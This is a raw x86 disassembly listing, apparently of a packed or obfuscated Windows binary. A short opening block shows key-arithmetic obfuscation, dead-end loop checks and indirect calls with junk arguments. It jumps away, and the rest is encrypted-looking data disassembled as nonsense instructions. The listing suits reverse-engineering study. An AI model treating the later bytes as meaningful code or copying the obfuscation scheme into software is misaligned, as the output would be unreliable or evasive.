  41762d:	push   DWORD PTR [ebp-0x14]
  417630:	call   DWORD PTR ds:0x42ca10
  417636:	cmp    DWORD PTR ds:0x428ea9,0x4
  41763d:	jne    0x417650
  417643:	mov    esi,DWORD PTR ds:0x428ea9
  417649:	inc    esi
  41764a:	mov    DWORD PTR ds:0x428ea9,esi
  417650:	jmp    0x4175ec
  417655:	xor    eax,ecx
  417657:	add    eax,edx
  417659:	and    DWORD PTR ds:0x428e65,0x0
  417663:	jmp    0x417675
  417668:	mov    edi,DWORD PTR ds:0x428e65
  41766e:	inc    edi
  41766f:	mov    DWORD PTR ds:0x428e65,edi
  417675:	cmp    DWORD PTR ds:0x428e65,0x13
  41767c:	jae    0x4176b6
  417682:	cmp    DWORD PTR ds:0x428e65,0x15
  417689:	jbe    0x4176b6
  41768f:	jmp    0x4176b1
  417694:	push   DWORD PTR [ebp-0x20]
  417697:	push   0x1f3c
  41769c:	push   0x8271
  4176a1:	push   0x8e4d
  4176a6:	push   0x428ec5
  4176ab:	call   DWORD PTR ds:0x42ca14
  4176b1:	jmp    0x417668
  4176b6:	mov    DWORD PTR [ebp-0x20],eax
  4176b9:	mov    eax,DWORD PTR [ebp+0xc]
  4176bc:	mov    esi,DWORD PTR [ebp-0x8]
  4176bf:	xor    eax,ecx
  4176c1:	add    eax,edx
  4176c3:	imul   eax,DWORD PTR [esi]
  4176c6:	mov    esi,DWORD PTR [ebp+0x8]
  4176c9:	xor    esi,ecx
  4176cb:	add    esi,edx
  4176cd:	cmp    esi,eax
  4176cf:	mov    eax,DWORD PTR [ebp-0x4]
  4176d2:	mov    edi,0xffcd8d08
  4176d7:	je     0x4176f6
  4176dd:	mov    esi,DWORD PTR [ebp-0x20]
  4176e0:	add    DWORD PTR [eax],esi
  4176e2:	mov    eax,DWORD PTR [ebp-0x4]
  4176e5:	mov    esi,DWORD PTR [ebp+0xc]
  4176e8:	xor    esi,ecx
  4176ea:	add    esi,edx
  4176ec:	imul   esi,DWORD PTR [eax]
  4176ef:	mov    DWORD PTR [eax],esi
  4176f1:	jmp    0x4176fb
  4176f6:	mov    esi,DWORD PTR [ebp+0x14]
  4176f9:	xor    DWORD PTR [eax],esi
  4176fb:	mov    eax,DWORD PTR [ebp-0x4]
  4176fe:	mov    esi,DWORD PTR [ebp+0x10]
  417701:	xor    esi,ecx
  417703:	sub    edi,esi
  417705:	add    DWORD PTR [eax],edi
  417707:	mov    eax,DWORD PTR [ebp-0x4]
  41770a:	mov    esi,DWORD PTR [ebp-0x8]
  41770d:	add    esi,DWORD PTR [eax]
  41770f:	mov    DWORD PTR [ebp-0x8],esi
  417712:	mov    eax,DWORD PTR [ebp+0xc]
  417715:	mov    esi,DWORD PTR [ebp+0xc]
  417718:	xor    esi,ecx
  41771a:	xor    eax,ecx
  41771c:	lea    eax,[eax+esi*1+0x64e5f0]
  417723:	mov    esi,DWORD PTR [ebp+0xc]
  417726:	xor    esi,ecx
  417728:	add    esi,edx
  41772a:	imul   eax,esi
  41772d:	mov    esi,DWORD PTR [ebp+0xc]
  417730:	jmp    0x419aea
  417735:	sbb    DWORD PTR [edx+0x3a2c7d2b],ecx
  41773b:	cmp    DWORD PTR [edx],ebx
  41773d:	inc    edi
  41773e:	fst    st(5)
  417740:	inc    ecx
  417741:	ins    DWORD PTR es:[edi],dx
  417742:	test   esp,ecx
  417744:	xlat   BYTE PTR ds:[ebx]
  417745:	stos   BYTE PTR es:[edi],al
  417746:	mov    ecx,0x9e187b7c
  41774b:	jnp    0x4177c8
  41774d:	and    al,0x40
  41774f:	(bad)  
  417750:	mov    ah,0x57
  417752:	push   edi
  417753:	in     al,0x9b
  417755:	pop    es
  417756:	inc    esp
  417757:	inc    esp
  417758:	in     al,dx
  417759:	and    al,BYTE PTR [ebp-0x32]
  41775c:	mov    ah,0xdf
  41775e:	pop    eax
  41775f:	push   ecx
  417760:	jo     0x417701
  417762:	cmp    eax,eax
  417764:	test   eax,0xee18ee23
  417769:	sar    ah,cl
  41776b:	ins    BYTE PTR es:[edi],dx
  41776c:	sbb    al,0x2e
  41776e:	sbb    ecx,eax
  417770:	pusha  
  417771:	xchg   DWORD PTR [ebx],esp
  417773:	jge    0x417738
  417775:	xchg   ecx,eax
  417776:	inc    esi
  417777:	adc    al,BYTE PTR [esi+edx*1]
  41777a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777b:	(bad)  
  41777c:	mov    al,0xe9
  41777e:	cli    
  41777f:	fist   DWORD PTR [esp+ebp*2]
  417782:	jnp    0x417771
  417784:	or     ebx,DWORD PTR [ebx]
  417786:	scas   eax,DWORD PTR es:[edi]
  417787:	ss cmp al,0x17
  41778a:	lahf   
  41778b:	mov    dl,0x76
  41778d:	ret    
  41778e:	(bad)  
  41778f:	pop    eax
  417790:	jbe    0x41777d
  417792:	retf   
  417793:	pop    ebx
  417794:	dec    ebx
  417795:	add    ebx,DWORD PTR ds:0x7d55b59a
  41779b:	test   eax,0xe273d0a7
  4177a0:	jae    0x4177ca
  4177a2:	push   ds
  4177a3:	loopne 0x417750
  4177a5:	loopne 0x417742
  4177a7:	aas    
  4177a8:	test   DWORD PTR [esi+ebp*4+0xa945ac2],ebp
  4177af:	inc    edx
  4177b0:	mov    ebx,0x29fe7503
  4177b5:	(bad)  
  4177b7:	shr    DWORD PTR [edi+0x1f],cl
  4177ba:	pusha  
  4177bb:	sahf   
  4177bc:	adc    al,0xf4
  4177be:	loopne 0x41783f
  4177c0:	daa    
  4177c1:	dec    ecx
  4177c2:	pop    edx
  4177c3:	scas   al,BYTE PTR es:[edi]
  4177c4:	xchg   esp,eax
  4177c5:	inc    ebp
  4177c6:	std    
  4177c7:	sub    DWORD PTR [edi-0x774469e8],ecx
  4177cd:	sub    DWORD PTR [ecx+0x6e],esp
  4177d0:	ds ja  0x4177b7
  4177d3:	jbe    0x417775
  4177d5:	mov    ebp,ds
  4177d7:	jo     0x4177dc
  4177d9:	jns    0x4177c8
  4177db:	out    0xac,eax
  4177dd:	adc    al,0x7c
  4177df:	int3   
  4177e0:	iret   
  4177e1:	push   DWORD PTR [edi-0x7e4a108c]
  4177e7:	cwde   
  4177e8:	push   cs
  4177e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177ea:	cwde   
  4177eb:	cmp    al,0x4c
  4177ed:	aaa    
  4177ee:	xchg   DWORD PTR [eax+0x14],eax
  4177f1:	int3   
  4177f2:	pop    eax
  4177f3:	sbb    al,0x63
  4177f5:	mov    ecx,0x7f44d682
  4177fa:	sbb    al,0x78
  4177fc:	stos   DWORD PTR es:[edi],eax
  4177fd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4177ff:	or     DWORD PTR [edi-0x57],ebp
  417802:	test   al,0x1f
  417804:	cmp    DWORD PTR [eax],edx
  417806:	outs   dx,BYTE PTR ds:[esi]
  417807:	(bad)  
  417808:	pusha  
  417809:	mov    BYTE PTR [ebx+0x7c],ah
  41780c:	sahf   
  41780d:	aaa    
  41780e:	sub    al,0x81
  417810:	repz ds cmc 
  417813:	or     al,0xdc
  417815:	les    ebp,FWORD PTR [edx+0x72]
  417818:	jmp    0x56a6:0xa840cd2f
  41781f:	stos   DWORD PTR es:[edi],eax
  417820:	test   BYTE PTR [edx+0x1cefd0b7],0x9d
  417827:	(bad)  [ecx+0x4d]
  41782a:	mov    edi,0x86456013
  41782f:	popf   
  417830:	test   al,0xbb
  417832:	and    BYTE PTR [ecx],0xef
  417835:	(bad)  
  417836:	push   edx
  417837:	pop    eax
  417838:	sub    eax,esp
  41783a:	inc    edi
  41783b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783c:	mov    edi,0x3b34a943
  417841:	add    edx,DWORD PTR ds:0x72604114
  417847:	push   ss
  417848:	and    dl,ah
  41784a:	inc    ecx
  41784b:	jb     0x4177d4
  41784d:	ins    DWORD PTR es:[edi],dx
  41784e:	fild   WORD PTR [edx-0x4b]
  417851:	enter  0xd4d4,0xb3
  417855:	sub    ah,BYTE PTR [esi+edi*8-0x32]
  417859:	outs   dx,BYTE PTR ds:[esi]
  41785a:	clc    
  41785b:	ins    DWORD PTR es:[edi],dx
  41785c:	mov    eax,0xbc707a79
  417861:	push   edx
  417862:	cmp    eax,0x3b8a3cdc
  417867:	xchg   ebp,eax
  417868:	stc    
  417869:	outs   dx,DWORD PTR ds:[esi]
  41786a:	lods   eax,DWORD PTR ds:[esi]
  41786b:	repnz mov al,0x28
  41786e:	test   al,0x77
  417870:	inc    edi
  417871:	(bad)  
  417872:	push   0x85406f19
  417877:	sbb    al,0x76
  417879:	out    dx,eax
  41787a:	bnd call 0x5c8de5b5
  417880:	jg     0x4178d5
  417882:	loope  0x4178ff
  417884:	xchg   ebx,eax
  417885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417886:	xchg   ecx,eax
  417887:	addr16 and al,0xe2
  41788a:	inc    edi
  41788b:	push   ds
  41788c:	aas    
  41788d:	inc    esi
  41788e:	cmp    eax,0x3c8c4fdc
  417893:	fmul   DWORD PTR [edi+0xcdb6121]
  417899:	hlt    
  41789a:	mov    es,WORD PTR [ecx]
  41789c:	adc    BYTE PTR [ebx+0x51],ch
  41789f:	icebp  
  4178a0:	cmp    DWORD PTR [ebx+0x19d72cbb],ebx
  4178a6:	jbe    0x417865
  4178a8:	mov    BYTE PTR [ebp+0x655c982a],al
  4178ae:	dec    esi
  4178af:	xor    al,0xe3
  4178b1:	mov    eax,ds:0xb02a0f95
  4178b6:	dec    edi
  4178b7:	inc    ecx
  4178b8:	stc    
  4178b9:	ret    
  4178ba:	jecxz  0x41791b
  4178bc:	repz les ecx,FWORD PTR [edx+eax*2+0x62]
  4178c1:	test   al,0x98
  4178c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c4:	in     eax,0xa5
  4178c6:	int    0xa0
  4178c8:	in     eax,0xeb
  4178ca:	dec    esp
  4178cb:	or     DWORD PTR [edx-0x329a7a13],edx
  4178d1:	add    esp,DWORD PTR [ecx-0x3]
  4178d4:	test   DWORD PTR [edi-0x15065fd],esi
  4178da:	mov    al,ds:0x2f3ad8d0
  4178df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178e0:	enter  0x445c,0x2c
  4178e4:	push   esp
  4178e5:	inc    edx
  4178e6:	add    edx,esi
  4178e8:	test   BYTE PTR [ecx+0x52],0x5c
  4178ec:	dec    ecx
  4178ed:	lock mov edx,0x9bf5cf36
  4178f3:	retf   
  4178f4:	into   
  4178f5:	fisubr WORD PTR [esi]
  4178f7:	adc    eax,0x25102b6b
  4178fc:	mov    esp,0xd4f9aa25
  417901:	dec    edx
  417902:	fld    DWORD PTR [ecx]
  417904:	mov    ecx,0x7bc616c5
  417909:	shl    bl,0xc
  41790c:	lods   eax,DWORD PTR ds:[esi]
  41790d:	enter  0xcf90,0x7c
  417911:	mov    ebp,0x2e488e37
  417916:	push   cs
  417917:	push   es
  417918:	mov    WORD PTR [esi+edi*1+0x7610a2fb],?
  41791f:	or     DWORD PTR [eax-0x942b147],ecx
  417925:	(bad)  
  417926:	mov    edx,0x94bc251a
  41792b:	sbb    al,0xc7
  41792d:	jmp    0x6de07ed
  417932:	aas    
  417933:	mov    edi,0xee094f1d
  417938:	fcom   QWORD PTR [edi+0x6859b3d1]
  41793e:	dec    eax
  41793f:	and    ch,BYTE PTR [ebx]
  417941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417942:	or     ch,dh
  417944:	mov    ds,WORD PTR [ecx]
  417946:	push   edx
  417947:	xchg   DWORD PTR [edi-0x67faad91],esp
  41794d:	pop    ebx
  41794e:	(bad)  
  41794f:	sti    
  417950:	dec    edx
  417951:	stos   BYTE PTR es:[edi],al
  417952:	(bad)  
  417953:	xchg   ebx,eax
  417954:	es jnp 0x41792f
  417957:	add    dh,BYTE PTR [eax]
  417959:	(bad)  
  41795a:	call   0x2db6:0x387ed5a5
  417961:	xchg   edi,eax
  417962:	mov    esi,0xe912f578
  417967:	int    0x4f
  417969:	sbb    al,0xba
  41796b:	(bad)  
  41796c:	popa   
  41796d:	jmp    0x7ecf:0x100cab2c
  417974:	dec    esp
  417975:	jg     0x4179c2
  417977:	push   esp
  417978:	cmp    eax,DWORD PTR [edi]
  41797a:	jecxz  0x41795b
  41797c:	jns    0x417901
  41797e:	sub    al,0x3c
  417980:	sub    eax,0xe22ccf47
  417985:	adc    eax,0xdc3949fe
  41798a:	imul   ebx,DWORD PTR [edx+eiz*1-0x4d03f4a7],0x3c
  417992:	cmp    al,0x4d
  417994:	and    DWORD PTR [ebx-0x7c],eax
  417997:	and    ecx,esi
  417999:	mov    al,0x8
  41799b:	into   
  41799c:	fldcw  WORD PTR [ecx]
  41799e:	jecxz  0x417990
  4179a0:	inc    esp
  4179a1:	push   ebx
  4179a2:	jecxz  0x417950
  4179a4:	xor    al,0x55
  4179a6:	mov    dl,0xa3
  4179a8:	loopne 0x4179ab
  4179aa:	jmp    0x8170:0x413645c4
  4179b1:	cmp    eax,0x54ac48
  4179b6:	or     BYTE PTR [ecx-0x5500b031],ah
  4179bc:	jo     0x417991
  4179be:	mov    eax,ds:0x89e0c859
  4179c3:	loopne 0x4179cd
  4179c5:	rol    esp,1
  4179c7:	cmp    eax,0x2d70686a
  4179cc:	and    esp,DWORD PTR [eax-0x16]
  4179cf:	sbb    al,0x7c
  4179d1:	adc    eax,0x1c8ce8de
  4179d6:	xchg   ecx,eax
  4179d7:	adc    dh,ah
  4179d9:	push   cs
  4179da:	cdq    
  4179db:	mov    ecx,?
  4179dd:	std    
  4179de:	scas   al,BYTE PTR es:[edi]
  4179df:	lods   al,BYTE PTR ds:[esi]
  4179e0:	add    eax,0x1c3db093
  4179e5:	mov    bl,0x61
  4179e7:	push   ebp
  4179e8:	(bad)  
  4179e9:	stc    
  4179ea:	mov    ds:0xc6c337bf,al
  4179ef:	push   0xffffffb0
  4179f1:	int3   
  4179f2:	xchg   esi,eax
  4179f3:	jno    0x417a08
  4179f5:	or     dl,BYTE PTR [ebx+eax*8-0x48010151]
  4179fc:	retf   0x2b81
  4179ff:	fimul  DWORD PTR es:[edi+0x3848b420]
  417a06:	cmpxchg BYTE PTR [eax-0x16c98135],al
  417a0d:	neg    DWORD PTR [ebx+0x29d77671]
  417a13:	aas    
  417a14:	inc    eax
  417a15:	loopne 0x417a88
  417a17:	aaa    
  417a18:	mov    ebx,DWORD PTR [esi-0x63]
  417a1b:	mov    dl,BYTE PTR [esi+0x5c]
  417a1e:	or     BYTE PTR [edx],al
  417a20:	xor    ebp,eax
  417a22:	shl    BYTE PTR [esi+ebp*4+0x5648c334],1
  417a29:	cmp    DWORD PTR [ebx-0x6efb3caa],edi
  417a2f:	adc    ch,0x12
  417a32:	inc    ebp
  417a33:	rcl    dh,1
  417a35:	jmp    0xb558:0x4ca80a7f
  417a3c:	pop    ebp
  417a3d:	mov    cl,0x40
  417a3f:	xchg   BYTE PTR [ebp-0x72],ch
  417a42:	(bad)  
  417a43:	jne    0x417a46
  417a45:	(bad)  
  417a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a47:	adc    ebp,ebp
  417a49:	jno    0x417a49
  417a4b:	mov    ebp,0x5185e96e
  417a50:	out    dx,eax
  417a51:	imul   esp,esp,0x12
  417a54:	xchg   ecx,eax
  417a55:	sahf   
  417a56:	fdiv   DWORD PTR fs:[ebx-0x6db97039]
  417a5d:	inc    DWORD PTR [edi-0x1a]
  417a60:	mov    al,0xfd
  417a62:	ds hlt 
  417a64:	pmaxub mm1,QWORD PTR [edx-0x6c]
  417a68:	pop    eax
  417a69:	cwde   
  417a6a:	xor    DWORD PTR [ecx],esi
  417a6c:	aam    0xbe
  417a6e:	push   DWORD PTR [ecx+0x4a37c09d]
  417a74:	xor    al,0x7a
  417a76:	lods   al,BYTE PTR ds:[esi]
  417a77:	mov    ds:0x58b6f6d3,eax
  417a7c:	xchg   ebx,eax
  417a7d:	mov    ss,WORD PTR [edi]
  417a7f:	xchg   ebp,eax
  417a80:	add    DWORD PTR [ebx+0x872c6ae],edx
  417a86:	push   es
  417a87:	sub    esi,esi
  417a89:	scas   eax,DWORD PTR es:[edi]
  417a8a:	aam    0xb9
  417a8c:	inc    esi
  417a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a8e:	xchg   esi,eax
  417a8f:	pop    ebp
  417a90:	and    DWORD PTR [edi],ebx
  417a92:	dec    ebx
  417a93:	bound  esi,QWORD PTR [edx-0x6f905f63]
  417a99:	(bad)  
  417a9c:	and    BYTE PTR [ebp+0x26],ah
  417a9f:	hlt    
  417aa0:	imul   cx,WORD PTR [edx-0x70ace604],0x1837
  417aa9:	ret    0x7543
  417aac:	in     eax,dx
  417aad:	mov    ds:0xecdda33,eax
  417ab2:	sbb    esp,eax
  417ab4:	arpl   ax,bx
  417ab6:	inc    ecx
  417ab7:	aam    0x5c
  417ab9:	pop    ebp
  417aba:	ins    BYTE PTR es:[edi],dx
  417abb:	cwde   
  417abc:	pop    eax
  417abe:	xlat   BYTE PTR ds:[ebx]
  417abf:	jno    0x417aba
  417ac1:	sub    eax,0xfe47190b
  417ac6:	cmp    bl,BYTE PTR [ebp+ecx*8+0x4be0a405]
  417acd:	mov    ch,0xf5
  417acf:	dec    edx
  417ad0:	mov    esp,0x7bfecdb5
  417ad5:	addr16 in al,0x6b
  417ad8:	adc    al,0xf0
  417ada:	hlt    
  417adb:	adc    DWORD PTR [edi-0x19],ecx
  417ade:	arpl   WORD PTR [ebx+esi*4+0x3fe808e3],di
  417ae5:	dec    ecx
  417ae6:	jae    0x417ad3
  417ae8:	pop    eax
  417ae9:	pop    edi
  417aea:	jnp    0x417ae6
  417aec:	or     ecx,DWORD PTR [ebp-0x3f]
  417aef:	popa   
  417af0:	cmp    DWORD PTR [ecx],ebx
  417af2:	into   
  417af3:	mov    esi,0xe913c683
  417af8:	jg     0x417b13
  417afa:	and    BYTE PTR [edx+0x157bd34a],dh
  417b00:	(bad)  
  417b01:	in     al,dx
  417b02:	mov    ebp,0x8a90ca2d
  417b07:	xlat   BYTE PTR ds:[ebx]
  417b08:	sti    
  417b09:	pop    es
  417b0a:	das    
  417b0b:	shr    esi,0xd6
  417b0e:	inc    esi
  417b0f:	sbb    al,0x2b
  417b11:	push   0xc6977d6f
  417b16:	jnp    0x417b6d
  417b18:	sub    ebx,DWORD PTR [esi+edx*8]
  417b1b:	pop    ecx
  417b1c:	sbb    BYTE PTR [edx],bh
  417b1e:	cmc    
  417b1f:	xchg   DWORD PTR [edx+edi*4+0x6353e68a],edx
  417b26:	scas   al,BYTE PTR es:[edi]
  417b27:	int    0x9f
  417b29:	(bad)  
  417b2a:	jp     0x417aaf
  417b2c:	outs   dx,DWORD PTR ds:[esi]
  417b2d:	rol    BYTE PTR [ebx-0x69],0xd7
  417b31:	sub    al,0xd1
  417b33:	adc    eax,0x9a0b5ba0
  417b38:	popa   
  417b39:	lods   al,BYTE PTR ds:[esi]
  417b3a:	test   ah,cl
  417b3c:	mov    esi,0x646898d9
  417b41:	fsubrp st(2),st
  417b43:	add    DWORD PTR ds:0x86fd593f,eax
  417b49:	mov    BYTE PTR [esi],dl
  417b4b:	(bad)  
  417b4d:	push   ebp
  417b4e:	xchg   esi,eax
  417b4f:	daa    
  417b50:	jg     0x417b56
  417b52:	and    DWORD PTR ds:0xfe3fbf31,edx
  417b58:	push   ebx
  417b59:	dec    eax
  417b5a:	cmp    eax,0x98d1bb49
  417b5f:	neg    DWORD PTR [ecx]
  417b61:	add    al,0x3d
  417b63:	je     0x417b46
  417b65:	clc    
  417b66:	pop    eax
  417b67:	and    DWORD PTR [esi+0x2fb05bfe],edi
  417b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b6e:	sub    edi,DWORD PTR [ebp-0x5a8a6314]
  417b74:	or     eax,0x51b02749
  417b79:	mov    dl,0x24
  417b7b:	push   ss
  417b7c:	push   cs
  417b7d:	xchg   ecx,eax
  417b7e:	pop    edi
  417b7f:	and    cl,BYTE PTR [eax+0x53]
  417b82:	push   0x4b
  417b84:	jb     0x417b69
  417b86:	ins    BYTE PTR es:[edi],dx
  417b87:	in     al,0x6
  417b89:	xchg   ebx,eax
  417b8a:	hlt    
  417b8b:	mov    ds:0x795c4c24,al
  417b90:	inc    edi
  417b91:	add    dh,BYTE PTR [ebp+edi*2-0x3]
  417b95:	daa    
  417b96:	dec    edx
  417b97:	js     0x417bbb
  417b99:	retf   
  417b9a:	leave  
  417b9b:	mov    eax,ds:0x3c9e42fb
  417ba0:	inc    eax
  417ba1:	iret   
  417ba2:	push   ebp
  417ba3:	pop    ss
  417ba4:	sub    bh,BYTE PTR [ebx-0x240e124d]
  417baa:	test   eax,0xf8385542
  417baf:	cmp    eax,0x456931ea
  417bb4:	or     bh,BYTE PTR [eax]
  417bb6:	js     0x417c2f
  417bb8:	mov    cl,0x66
  417bba:	xchg   edi,eax
  417bbb:	inc    ecx
  417bbc:	add    eax,0xc283a778
  417bc1:	out    0xfb,al
  417bc3:	es into 
  417bc5:	lock push esi
  417bc7:	test   BYTE PTR [eax-0x73],ch
  417bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bcb:	adc    ch,BYTE PTR [ebx+edi*4+0x6bc379a4]
  417bd2:	pop    esi
  417bd3:	add    bh,ch
  417bd5:	nop
  417bd6:	dec    ebx
  417bd7:	nop
  417bd8:	push   ecx
  417bd9:	pop    ecx
  417bda:	fs stos DWORD PTR es:[edi],eax
  417bdc:	xchg   esi,eax
  417bdd:	fst    QWORD PTR [eax+0x101cc8f7]
  417be3:	loope  0x417c2d
  417be5:	cmp    al,0xf8
  417be7:	std    
  417be8:	imul   eax,DWORD PTR [edx+0x12],0x56
  417bec:	jecxz  0x417bd6
  417bee:	ss push eax
  417bf0:	mov    ds:0x348301b0,eax
  417bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf6:	jmp    0xc706:0x20660e08
  417bfd:	(bad)  
  417bfe:	jl     0x417bac
  417c00:	or     ebx,DWORD PTR [esi+ebx*1]
  417c03:	lods   eax,DWORD PTR ds:[esi]
  417c04:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c06:	pop    es
  417c07:	xor    BYTE PTR [edx],ch
  417c09:	pop    ds
  417c0a:	cmp    al,BYTE PTR [ebp+0x303d9a03]
  417c10:	loop   0x417c0d
  417c12:	mov    ds:0xa56547c3,eax
  417c17:	xor    BYTE PTR [ecx],bh
  417c19:	fcom   st(1)
  417c1b:	popf   
  417c1c:	mov    ds:0x23151844,al
  417c21:	fxch   st(7)
  417c23:	xor    eax,0x6df7fe69
  417c28:	out    dx,al
  417c29:	sub    BYTE PTR [edx-0x2a60adac],bh
  417c2f:	xchg   esi,eax
  417c30:	or     BYTE PTR [eax],ch
  417c32:	inc    ecx
  417c33:	cli    
  417c34:	sbb    eax,0xb86eb8db
  417c39:	and    dh,BYTE PTR [esi+0x6e]
  417c3c:	or     al,0x37
  417c3e:	pusha  
  417c3f:	sub    eax,0x3dd73ec0
  417c44:	retf   0x6f23
  417c47:	jno    0x417c60
  417c49:	inc    esi
  417c4a:	daa    
  417c4b:	mov    eax,ds:0x68be2c47
  417c50:	pop    esp
  417c51:	ror    BYTE PTR [esi+ecx*1-0x152dedec],1
  417c58:	xor    BYTE PTR [ecx-0x5ba126e5],dh
  417c5e:	stos   DWORD PTR es:[edi],eax
  417c5f:	xor    al,0x87
  417c61:	outs   dx,DWORD PTR ds:[esi]
  417c62:	ins    DWORD PTR es:[edi],dx
  417c63:	ret    0xfa50
  417c66:	and    al,0x13
  417c68:	mov    gs,WORD PTR [eax+0x617b92ec]
  417c6e:	scas   eax,DWORD PTR es:[edi]
  417c6f:	xor    BYTE PTR [ecx],0x24
  417c72:	shl    BYTE PTR [esi+eiz*4+0x74],1
  417c76:	in     al,dx
  417c77:	add    al,BYTE PTR [ebx+0x71bced05]
  417c7d:	dec    eax
  417c7e:	jbe    0x417c9d
  417c80:	jmp    0xbed8:0x501e30e4
  417c87:	cli    
  417c88:	bt     esi,esp
  417c8b:	pop    esp
  417c8c:	or     eax,0xe4b8f3c9
  417c91:	repnz mov ebp,DWORD PTR [eax]
  417c94:	jnp    0x417ca3
  417c96:	xchg   ecx,eax
  417c97:	cmp    al,ah
  417c99:	(bad)  [edi+0x39]
  417c9c:	jg     0x417d00
  417c9e:	sbb    eax,DWORD PTR [edi-0x3df8930f]
  417ca4:	mov    ch,0x7
  417ca6:	mov    ds:0x80482f0f,al
  417cab:	xchg   bh,bl
  417cad:	nop
  417cae:	in     al,0x94
  417cb0:	ja     0x417c5e
  417cb2:	mov    dh,al
  417cb4:	jge    0x417d1c
  417cb6:	retf   
  417cb7:	lods   al,BYTE PTR ds:[esi]
  417cb8:	mov    ch,0x4b
  417cba:	xchg   edi,eax
  417cbb:	mov    ch,cl
  417cbd:	imul   ecx,DWORD PTR [esi+0x7615db5b],0x75329f1e
  417cc7:	popf   
  417cc8:	(bad)  
  417cc9:	gs mov edx,0x29c602a4
  417ccf:	xor    DWORD PTR [esi-0x2b],esi
  417cd2:	mov    eax,0xb690e227
  417cd7:	(bad)  
  417cd8:	jp     0x417d3b
  417cda:	mov    bl,0x45
  417cdc:	dec    esi
  417cdd:	mov    DWORD PTR [eax],esp
  417cdf:	pop    ebp
  417ce0:	dec    ecx
  417ce1:	repz inc ecx
  417ce3:	sub    dl,BYTE PTR [edx-0x58]
  417ce6:	dec    BYTE PTR [ebx-0x2b0fe8a0]
  417cec:	and    dl,cl
  417cee:	xor    al,0xbc
  417cf0:	mov    ds:0xbf430902,al
  417cf5:	dec    ebp
  417cf6:	outs   dx,BYTE PTR ds:[esi]
  417cf7:	mov    eax,ds:0xe51a01c0
  417cfc:	mov    al,ds:0x456e8fb5
  417d01:	mov    eax,0x5841e2cd
  417d06:	adc    DWORD PTR [esi],0x23c13c94
  417d0c:	mov    bl,0x4a
  417d0e:	cs jo  0x417d5f
  417d11:	loop   0x417cb4
  417d13:	mov    ds:0x10f2f841,al
  417d18:	mov    cl,0xb
  417d1a:	dec    ebx
  417d1b:	sti    
  417d1c:	or     DWORD PTR [eax],ebx
  417d1e:	lds    edx,FWORD PTR [ecx]
  417d20:	das    
  417d21:	xor    DWORD PTR [esi+0x6b],eax
  417d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d25:	out    0xe5,al
  417d27:	fldenv [edx]
  417d29:	adc    ch,dl
  417d2b:	pop    ebx
  417d2c:	mov    eax,0x140fee27
  417d31:	in     eax,0x42
  417d33:	push   eax
  417d34:	push   eax
  417d35:	imul   edx,eax,0x53ed2eaa
  417d3b:	and    BYTE PTR [edx],0x1
  417d3e:	je     0x417cf4
  417d40:	test   eax,0x7b7ca87a
  417d45:	mov    edx,0xef2c08fd
  417d4a:	adc    cl,al
  417d4c:	adc    BYTE PTR [edx+eiz*8],bl
  417d4f:	inc    eax
  417d50:	sbb    esp,DWORD PTR [ebx-0x10]
  417d53:	jnp    0x417dc6
  417d55:	neg    BYTE PTR [eax+eax*4-0x72]
  417d59:	repnz mov bl,0x25
  417d5c:	cmp    ebp,DWORD PTR [esi-0x70d9f484]
  417d62:	pop    edi
  417d63:	ror    DWORD PTR [ebx+0x5e],1
  417d66:	inc    esp
  417d67:	imul   esp,esi,0xd973b8cd
  417d6d:	jo     0x417d49
  417d6f:	mov    esp,0x4d40d1b0
  417d74:	add    dl,BYTE PTR [eax-0x5e]
  417d77:	ja     0x417d46
  417d79:	pop    ecx
  417d7a:	popf   
  417d7b:	pop    ds
  417d7c:	push   0x3b8ba83
  417d81:	push   ss
  417d82:	repnz pop edx
  417d84:	push   0xffffff88
  417d86:	pop    ss
  417d87:	inc    ecx
  417d88:	pop    esp
  417d89:	xor    DWORD PTR [esi-0x301fe08a],esi
  417d8f:	fsubr  QWORD PTR [edx]
  417d91:	sub    ebx,DWORD PTR [edi+0x3a]
  417d94:	jp     0x417d98
  417d96:	sahf   
  417d97:	lods   eax,DWORD PTR ds:[esi]
  417d98:	lds    ebp,FWORD PTR [esi+0x40d3b3d0]
  417d9e:	stos   BYTE PTR es:[edi],al
  417d9f:	leave  
  417da0:	adc    al,0x2e
  417da2:	call   0xabcb:0xfecb8fbe
  417da9:	je     0x417ddf
  417dab:	ret    
  417dac:	loop   0x417d9d
  417dae:	retf   
  417daf:	xlat   BYTE PTR ds:[ebx]
  417db0:	jbe    0x417dd1
  417db2:	and    BYTE PTR [ebp+0x539cebd8],0xee
  417db9:	lahf   
  417dba:	adc    eax,0x383c2bed
  417dbf:	push   cs
  417dc0:	add    bh,BYTE PTR [esi]
  417dc2:	push   ecx
  417dc3:	(bad)  
  417dc4:	lahf   
  417dc5:	mov    edx,0x2da2e4c6
  417dca:	and    esp,DWORD PTR [ebx-0x22c529fa]
  417dd0:	lods   al,BYTE PTR ds:[esi]
  417dd1:	fcom   QWORD PTR [ebx-0x1e4915ba]
  417dd7:	ss pop esi
  417dd9:	xchg   ecx,eax
  417dda:	shl    DWORD PTR [edx+0x38],0x52
  417dde:	push   edi
  417ddf:	mov    eax,0xd30b88a4
  417de4:	repz fs mov edx,0xd0c81f16
  417deb:	jns    0x417dea
  417ded:	repnz gs pop ss
  417df0:	cmp    BYTE PTR [ecx-0x50245667],dl
  417df6:	and    BYTE PTR [di],ah
  417df9:	gs jne 0x417e62
  417dfc:	pop    ss
  417dfd:	xchg   ebx,eax
  417dfe:	mov    eax,0xe1bccb13
  417e03:	repz out 0xe,eax
  417e06:	jp     0x417e37
  417e08:	adc    eax,0x4bf4bb21
  417e0d:	mov    dh,0xd7
